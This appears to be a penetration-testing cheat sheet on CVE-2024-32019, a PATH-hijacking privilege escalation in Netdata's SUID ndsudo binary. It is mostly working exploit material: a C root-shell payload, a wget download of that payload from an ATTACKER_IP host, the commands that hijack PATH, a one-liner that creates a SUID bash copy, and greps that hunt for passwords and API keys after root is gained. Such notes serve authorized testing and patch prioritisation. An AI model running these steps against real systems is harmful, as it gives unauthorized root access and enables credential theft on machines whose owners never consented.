# Netdata

Netdata is a real-time performance monitoring system. The `ndsudo` SUID binary can be exploited for privilege escalation via PATH hijacking.

---

## Discovery

```bash
# Default port (localhost only)
curl -i http://127.0.0.1:19999

# Check version in response header
# Server: Netdata Embedded HTTP Server v1.45.2

# Find ndsudo binary
find / -name ndsudo 2>/dev/null
# /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo

# Check for SUID
ls -la /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
# -rwsr-x--- 1 root netdata 196K Apr  1  2024 ndsudo
```

---

## CVE-2024-32019 - ndsudo Privilege Escalation

The `ndsudo` tool shipped with affected versions allows an attacker to run arbitrary programs with root permissions via PATH hijacking.

**Vulnerability Type:** Untrusted Search Path (CWE-426) / PATH Hijacking

**CVSS Score:** 8.8 (High)

**Affected Versions:** >= v1.45.0, < v1.45.3, >= v1.44.0-60, < v1.45.0-169

**Reference:** https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93

### Prerequisites

- User must be in the `netdata` group (or have access to execute ndsudo)
- Or ndsudo has world-executable permissions

### Detection

```bash
# Check Netdata version
curl -i http://127.0.0.1:19999 | grep Server
# Vulnerable if: >= v1.45.0, < v1.45.3

# Check if you can execute ndsudo
groups
# Look for 'netdata' group membership

ls -la /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```

### Exploitation

The exploit works by creating a malicious binary named after a command that `ndsudo` tries to execute (like `arcconf`), then prepending its directory to PATH.

**Step 1: Create malicious binary**

Since the target may not have `gcc`, compile on attacker machine:

```c
// poc.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-p", NULL);
    perror("execl");
    return 1;
}
```

```bash
# Compile on attacker machine (match target architecture)
gcc -o poc poc.c

# Transfer to target
python3 -m http.server 8000
# On target:
wget http://ATTACKER_IP:8000/poc -O /dev/shm/poc
```

**Step 2: Exploit PATH hijacking**

```bash
# Rename to match expected command
mv /dev/shm/poc /dev/shm/arcconf
chmod +x /dev/shm/arcconf

# Prepend directory to PATH
export PATH=/dev/shm:$PATH

# Execute ndsudo with a command that triggers arcconf
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo arcconf-pd-info

# Root shell!
root@target:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root)
```

### Alternative Commands

Different ndsudo commands may work depending on installed plugins:

```bash
# Try different command variants
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo arcconf-pd-info
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo megacli-disk-info
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo smartctl-list
```

---

## Quick One-Liner

```bash
# Create SUID bash instead of interactive shell
cat > /dev/shm/arcconf << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
chmod +x /dev/shm/arcconf
PATH=/dev/shm:$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo arcconf-pd-info
/tmp/rootbash -p
```

---

## Post-Exploitation Notes

After gaining root, check Netdata config for additional credentials:

```bash
# Netdata config locations
/opt/netdata/usr/lib/netdata/conf.d/
/etc/netdata/

# Check for database connections, API keys, etc.
grep -r -i password /opt/netdata/usr/lib/netdata/conf.d/
grep -r -i api_key /opt/netdata/usr/lib/netdata/conf.d/
```

---

## References

- https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93
- https://github.com/juanbelin/CVE-2024-32019-POC
